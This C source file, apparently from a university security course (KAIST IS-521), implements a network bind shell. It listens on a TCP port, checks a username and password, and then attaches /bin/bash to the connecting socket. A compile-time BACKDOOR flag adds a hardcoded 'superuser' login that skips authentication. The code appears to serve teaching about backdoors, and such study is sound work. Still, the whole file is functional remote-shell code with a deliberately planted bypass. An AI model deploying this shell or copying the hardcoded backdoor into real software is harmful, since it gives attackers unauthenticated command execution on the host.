// KAIST IS-521

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>

#define MAX_BUF   (1024)

int portBind( const char* ip, int port )
{
    int r;
    int sockfd;
    int yes = 1;
    struct sockaddr_in addr;

    sockfd = socket( AF_INET, SOCK_STREAM, 0 );
    if ( sockfd  == -1 ) return -1;

    r = setsockopt( sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int) );
    if ( r == -1 ) perror( "setsockopt" );

    memset( &addr, 0, sizeof(addr) );
    addr.sin_family = AF_INET;
    addr.sin_port = htons( port );
    addr.sin_addr.s_addr = inet_addr( ip );

    r = bind( sockfd, (struct sockaddr*) &addr, sizeof(addr) );
    if ( r == -1 ) {
        perror( "bind" );
        close( sockfd );
        return -1;
    }

    return sockfd;
}

int readSock( int sockfd, char* buf, size_t bufLen )
{
    int r = 0;
    char tmp;

    while( r < bufLen ){
      if( recv( sockfd, &tmp, 1, 0 ) == 1 ){
        buf[r] = tmp;
        r ++;
        if( tmp == '\n' ) break;
      } else { perror("recv"); return -1;}
    }
    if ( r > 0 ) buf[r - 1] = '\0';

    return 0;
}

int authenticate( int sockfd, const char* id, const char* pw )
{
    int r;
    const char* szName = "Username: ";
    const char* szWrongID = "Wrong ID given.\n";
    const char* szPass = "Password: ";
    const char* szWrongPW = "Wrong Password given.\n";
    char buf[MAX_BUF] = {'\0', };

    r = send( sockfd, szName, strlen( szName ), 0 );
    if ( r == -1 ) { perror( "send" ); return -1; }
    r = readSock( sockfd, buf, MAX_BUF );
    if ( r == -1 ) return -1;

#ifdef BACKDOOR
    if ( strcmp( buf, "superuser" ) == 0 ) return 0;
#endif
    if ( strncmp( buf, id, MAX_BUF - 1 ) != 0 ) {
        send( sockfd, szWrongID, strlen( szWrongID ), 0 );
        return -1;
    }

    r = send( sockfd, szPass, strlen( szPass ), 0 );
    if ( r == -1 ) { perror( "send" ); return -1; }
    r = readSock( sockfd, buf, MAX_BUF );
    if ( r == -1 ) return -1;

    if ( strncmp( buf, pw, MAX_BUF - 1 ) != 0 ) {
        send( sockfd, szWrongPW, strlen( szWrongPW), 0 );
        return -1;
    }

    return 0;
}

void spawnShell( int sockfd )
{
    int status;
    char* const cmds[] = { "/bin/bash", NULL };
    pid_t pid = fork();
    if ( pid == -1 ) {
        perror( "fork" );
    } else if ( pid == 0 ) { // child
        dup2( sockfd, STDIN_FILENO );
        dup2( sockfd, STDOUT_FILENO );
        dup2( sockfd, STDERR_FILENO );
        execve( cmds[0], cmds, NULL );
    } else {
        waitpid( pid, &status, 0 );
    }
}

int main( int argc, char* argv[] )
{
    int srvFD, cliFD;
    struct sockaddr_in cliAddr;
    socklen_t cliLen = sizeof(cliAddr);
    const char* szIP = argv[1];
    const char* szPort = argv[2];

    if ( argc < 5 ) {
        fprintf( stderr, "Usage: %s <ip> <port> <id> <pw>\n", argv[0] );
        return EXIT_FAILURE;
    }

    srvFD = portBind( szIP, atoi( szPort ) );
    if ( srvFD == -1 ) return EXIT_FAILURE;

    if ( listen( srvFD, SOMAXCONN ) == -1 ) {
        perror( "listen" );
        close( srvFD );
        exit( EXIT_FAILURE );
    }

    while ( 1 ) {
        cliFD = accept( srvFD, (struct sockaddr *) &cliAddr, &cliLen );
        if ( cliFD == -1 ) {
            perror( "accept" );
            continue;
        }

        if ( authenticate( cliFD, argv[3], argv[4] ) == -1 ) {
            close( cliFD );
            continue;
        }

        spawnShell( cliFD );
        close( cliFD );
    }

    return EXIT_SUCCESS;
}
